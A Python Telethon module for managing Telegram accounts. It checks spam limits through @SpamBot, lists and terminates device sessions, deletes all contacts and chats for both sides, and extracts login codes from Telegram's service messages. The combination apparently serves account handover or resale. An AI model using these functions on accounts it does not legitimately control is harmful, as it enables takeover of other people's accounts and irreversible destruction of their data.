import asyncio
import logging
from datetime import datetime, timezone
from telethon import TelegramClient
from telethon.tl.functions.account import GetAuthorizationsRequest, ResetAuthorizationRequest
from telethon.tl.functions.messages import DeleteHistoryRequest, DeleteChatRequest
from telethon.tl.functions.contacts import DeleteContactsRequest
from telethon.tl.types import (
    User, Chat, Channel, InputPeerUser, InputPeerChat, InputPeerChannel,
    MessageEntityPhone
)
from telethon.errors import RPCError

logger = logging.getLogger(__name__)


async def check_spam_status(client: TelegramClient) -> str:
    """
    Check if an account is spam-limited using Telegram's @SpamBot.
    Returns a string: "✅ Clean (Not Spam)" or "⚠️ Limited / Restricted".
    """
    try:
        spam_bot = await client.get_entity("@SpamBot")
        msg = await client.send_message(spam_bot, "/start")
        await asyncio.sleep(1.5)

        async for m in client.iter_messages(spam_bot, limit=1):
            if m.text:
                text = m.text.lower()
                if "good" in text or "not" in text or "no restrictions" in text or "fine" in text:
                    return "✅ Clean (Not Spam)"
                elif "limited" in text or "restricted" in text or "spam" in text:
                    return "⚠️ Limited / Restricted"
                else:
                    return f"ℹ️ {m.text[:100]}"
        return "❓ Could not determine"
    except Exception as e:
        logger.warning(f"Spam check failed: {e}")
        return "❓ Check failed"


async def get_devices(client: TelegramClient) -> list:
    """
    Get all active authorized sessions (devices) for the account.
    Returns list of dicts with device info.
    """
    try:
        auths = await client(GetAuthorizationsRequest())
        devices = []
        for auth in auths.authorizations:
            devices.append({
                "hash": auth.hash,
                "device_model": auth.device_model or "Unknown",
                "platform": auth.platform or "Unknown",
                "app_name": auth.app_name or "Unknown",
                "app_version": auth.app_version or "",
                "ip": auth.ip or "",
                "country": auth.country or "",
                "region": auth.region or "",
                "date_created": auth.date_created,
                "date_active": auth.date_active,
                "current": auth.current,
                "official_app": auth.official_app,
                "password_pending": auth.password_pending,
            })
        return devices
    except Exception as e:
        logger.error(f"Failed to get devices: {e}")
        return []


async def terminate_device(client: TelegramClient, hash_id: int) -> bool:
    """Terminate a specific device session."""
    try:
        await client(ResetAuthorizationRequest(hash_id))
        return True
    except Exception as e:
        logger.error(f"Failed to terminate device {hash_id}: {e}")
        return False


async def clear_all_data(client: TelegramClient) -> dict:
    """
    Clear all contacts, dialogs (private chats, groups, channels).
    Returns a dict with counts of what was cleared.
    """
    result = {"contacts": 0, "dialogs": 0, "errors": 0}

    # 1. Delete all contacts
    try:
        contacts = await client.get_contacts()
        if contacts:
            input_users = [InputPeerUser(c.id, c.access_hash) for c in contacts if hasattr(c, 'access_hash') and c.access_hash]
            if input_users:
                await client(DeleteContactsRequest(id=input_users))
                result["contacts"] = len(input_users)
    except Exception as e:
        logger.error(f"Clear contacts error: {e}")
        result["errors"] += 1

    # 2. Delete all dialogs (chats, groups, channels)
    try:
        dialogs = await client.get_dialogs()
        for dialog in dialogs:
            try:
                entity = dialog.entity
                if isinstance(entity, User) and entity.id != 777000:  # Skip Telegram service
                    await client(DeleteHistoryRequest(
                        peer=entity,
                        max_id=0,
                        just_clear=False,
                        revoke=True
                    ))
                    result["dialogs"] += 1
                elif isinstance(entity, Chat):
                    await client.delete_dialog(entity)
                    result["dialogs"] += 1
                elif isinstance(entity, Channel):
                    if not entity.broadcast:  # Groups
                        try:
                            await client.delete_dialog(entity)
                            result["dialogs"] += 1
                        except Exception:
                            pass
                    else:  # Channels
                        try:
                            await client.delete_dialog(entity)
                            result["dialogs"] += 1
                        except Exception:
                            pass
            except Exception:
                result["errors"] += 1
                continue
    except Exception as e:
        logger.error(f"Clear dialogs error: {e}")
        result["errors"] += 1

    return result


async def fetch_otp(client: TelegramClient) -> str:
    """
    Fetch the latest OTP/code from Telegram service messages.
    """
    try:
        # Telegram sends login codes from user 777000
        async for msg in client.iter_messages(777000, limit=5):
            if msg.text:
                import re
                # Look for login code pattern: "Login code: XXXXX" or just code digits
                match = re.search(r'Login code[:.\s]*(\d{4,7})', msg.text, re.IGNORECASE)
                if match:
                    return match.group(1)
                # Try to find any numeric code
                match = re.search(r'(\d{4,7})', msg.text)
                if match:
                    # Verify it looks like a login code
                    if "code" in msg.text.lower() or "login" in msg.text.lower():
                        return match.group(1)
        return None
    except Exception as e:
        logger.error(f"Fetch OTP error: {e}")
        return None


def format_account_info(info: dict) -> str:
    """Format account info for displaying in bot messages."""
    name = f"{info.get('first_name', '')} {info.get('last_name', '')}".strip()
    username = info.get('username', '')
    text = (
        f"👤 **Account Dashboard**\n\n"
        f"├─ **Name**    : {name or 'Unknown'}\n"
        f"├─ **Phone**   : `{info.get('phone', 'Unknown')}`\n"
        f"├─ **User ID** : `{info.get('id', 'Unknown')}`\n"
        f"├─ **DC**      : DC-{info.get('dc_id', '?')}\n"
    )
    if username:
        text += f"├─ **Username**: @{username}\n"
    return text


def format_device(dev: dict, index: int = 0) -> str:
    """Format device info for display."""
    current = "✅ Current" if dev.get("current") else ""
    app = f"{dev.get('app_name', '')} {dev.get('app_version', '')}".strip()
    active_ts = dev.get("date_active", 0)
    created_ts = dev.get("date_created", 0)

    def _time_ago(ts):
        if not ts:
            return "Unknown"
        from datetime import datetime, timezone
        diff = datetime.now(timezone.utc) - datetime.fromtimestamp(ts, tz=timezone.utc)
        days = diff.days
        hours = diff.seconds // 3600
        mins = (diff.seconds % 3600) // 60
        if days > 0:
            return f"{days}d ago"
        if hours > 0:
            return f"{hours}h {mins}m ago"
        return f"{mins}m ago"

    text = (
        f"📱 **Device {index + 1}** {current}\n"
        f"├─ Model    : {dev.get('device_model', 'Unknown')}\n"
        f"├─ Platform : {dev.get('platform', 'Unknown')}\n"
        f"├─ App      : {app or 'Unknown'}\n"
        f"├─ IP       : {dev.get('ip', '') or ''}\n"
        f"├─ Region   : {dev.get('region', '') or ''} {dev.get('country', '') or ''}".strip() + "\n"
        f"├─ Active   : {_time_ago(active_ts)}\n"
        f"└─ Created  : {_time_ago(created_ts)}\n"
    )
    return text
